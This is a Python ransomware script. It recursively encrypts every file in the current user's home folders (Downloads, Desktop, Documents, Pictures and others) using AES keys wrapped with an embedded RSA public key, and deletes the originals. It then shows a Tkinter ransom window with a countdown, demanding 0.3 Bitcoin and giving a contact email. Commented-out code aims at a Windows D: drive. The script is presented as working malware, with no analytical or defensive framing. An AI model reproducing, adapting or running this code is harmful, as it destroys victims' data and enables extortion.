
import getpass 
import os
from Crypto.PublicKey import RSA
import base64
from Crypto.Cipher import PKCS1_OAEP, AES
from pathlib import Path
import tkinter as tk

#pk = '''MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxlJf5uyOZqCCEFYeMDk5S+nHQoGrL7Pv8q7D+3RmobxDvn8qXshupMA2a3/P42dYaBYHarha7JUO+H9Dkf67yQ9jiYBmahVmom4Y7UhDK7vQp0hZ/4k2eazupufOpQoHxufGHKgsciX7J0Qucsv/PNqPTFo0gH+t/iUgRoGpIVGQdM5xCKqGIUBwqs4tS7a6ApuQ8RXdxEE3wLt8vuIT1nQBOp7YWogDVLxYtnpoxSWWmjiceHbcSkTWMhzcKAs73di55HUY/qoqKF84z/kNpmk0HjIlRbU7AKSLhTVfJR7l7iE/zHD/9FxxAUJEEn+xyGMRc8d/H+YpE6ynLktSzQIDAQAB'''
pk='''MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwZaLqj2VxRWN/z+mj3Hr
m1bOrElusS5a2MxWcUci30T2K4tglAN4a4/AU+EeqDQlGMAa50KABZFmV6XkC15o
5nRHWH5JDw/05jvUrvJK7wLIuL3BnxBlu7JbmXchhkR2CIowGdN4PKTz5w9wX1gz
ZGkejQawDXyjjwhsXwOIjYYg1l6pxpP1cSMemIwhxa13Zg7r7iHPzr3DgKYVI5kj
QV7c6UjFOC9zoAbYyTd1NXXsCfY86uEcRbd/8zlcJuCW3S0Lp/EX0L0vy8jhRQ8o
8Dt7C/sIBBsO14p4lEJVhL19FphvuDIuOekhpQ29ol3bCseVGqi2quKsgHEJlKKh
3QIDAQAB'''
pk = base64.b64decode(pk)

def scanRecurse(baseDir):
    try:
        for entry in os.scandir(baseDir):
            if entry.is_file():
                yield entry
            else:
                yield from scanRecurse(entry.path)
    except Exception as e:
        print(e)
        pass

try:
 def encrypt(dataFile, pk):
   
    # read data from file
        extension = dataFile.suffix.lower()
        print(extension)
        dataFile = str(dataFile)
        with open(dataFile, 'rb') as f:
            data = f.read()
    
    
        data = bytes(data)

    
        key = RSA.import_key(pk)
        sessionKey = os.urandom(16)


        cipher = PKCS1_OAEP.new(key)
        encryptedSessionKey = cipher.encrypt(sessionKey)

    
        cipher = AES.new(sessionKey, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data)

    
        file_extension = Path(dataFile).suffix
        #print("File Extension: ", file_extension)
    #fileName=dataFile.split(extension)[0]
       
        print(dataFile)
        fileExtension = '.encrypted'
        encryptedFile = dataFile + fileExtension
        
        with open(encryptedFile, 'wb') as f:
            [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
        os.remove(dataFile)
except Exception as e:
        print(e)
        pass
       


    




    
    #print(getpass.getuser())
User_Name=getpass.getuser()
#Folders = ['Downloads','Desktop', 'Documents','Pictures','Videos','Music']
KFolders = ['Downloads','Desktop', 'Documents','Pictures','Videos','Music','Public']
#Ktest=['Pictures','Videos','Music']
#Folders=['Downloads']
for Folder in KFolders:
 try:
    directory = "//home//"+User_Name+"//"+Folder 
    #directory="D://"
    excludeExtension = ['.py','.pem', '.exe'] 
    #try:
    for item in scanRecurse(directory): 
         filePath = Path(item)
         fileType = filePath.suffix.lower()

         if fileType in excludeExtension:
                continue
         
         encrypt(filePath, pk)
 except Exception as e:
        print(e)
        pass
# if(os.path.isdir('D://')):
#  try:
     
#     directory="D://"
#     excludeExtension = ['.py','.pem', '.exe'] 
#     #try:
#     for item in scanRecurse(directory): 
#          filePath = Path(item)
#          fileType = filePath.suffix.lower()

#          if fileType in excludeExtension:
#                 continue
         
#     encrypt(filePath, pk)
#  except Exception as e:
#         print(e)
#         pass


         
    
    
# except Exception as e:
#     print(e)
#     pass
    
#     def cd(c):
#         h, m, s = c.split(':')
#         h = int(h)
#         m = int(m)
#         s = int(s)

#         label['text'] = '{}:{}:{}'.format(h, m, s)

#         if s > 0 or m > 0 or h > 0:
        
#             if s > 0:
#                 s -= 1
#             elif m > 0:
#                 m -= 1
#                 s = 59
#             elif h > 0:
#              h -= 1
#              m = 59
#              s = 59
#             r.after(1000, cd, '{}:{}:{}'.format(h, m, s)) 
#     r = tk.Tk()
#     r.title('Alert')
#     r.geometry('1000x1000')
#     r.resizable(False, False)
#     label1 = tk.Label(r, text='Your data is under risk, Pay me,\nor else locked !!\n Bitcoin(0.3) CRYPTOADDRESS:AGHSBXMBUE!O9MNH$32WDXNGMLP33#\nPlease send your public address to Ransomware@gmail.com\nAfter receiving the bitcoin will send the Decrypter payload'+e+" ", font=('calibri', 12,'bold'))
#     label1.pack()
#     label = tk.Label(r,font=('calibri', 50,'bold'), fg='white', bg='black')
#     label.pack()
#     cd('09:00:00')
#     r.mainloop()
#     pass

def cd(c):
        h, m, s = c.split(':')
        h = int(h)
        m = int(m)
        s = int(s)

        label['text'] = '{}:{}:{}'.format(h, m, s)

        if s > 0 or m > 0 or h > 0:
        
            if s > 0:
                s -= 1
            elif m > 0:
                m -= 1
                s = 59
            elif h > 0:
             h -= 1
             m = 59
             s = 59
            r.after(1000, cd, '{}:{}:{}'.format(h, m, s)) 
r = tk.Tk()
r.title('Alert')
r.geometry('1000x1000')
r.resizable(False, False)
label1 = tk.Label(r, text='Your data is under risk, Pay me,\nor else locked !!\n Bitcoin(0.3) CRYPTOADDRESS:AGHSBXMBUE!O9MNH$32WDXNGMLP33#\nPlease send your public address to Ransomware@gmail.com\nAfter receiving the bitcoin will send the Decrypter payload'+" ", font=('calibri', 12,'bold'))
label1.pack()
label = tk.Label(r,font=('calibri', 50,'bold'), fg='white', bg='black')
label.pack()
cd('09:00:00')
r.mainloop()
 

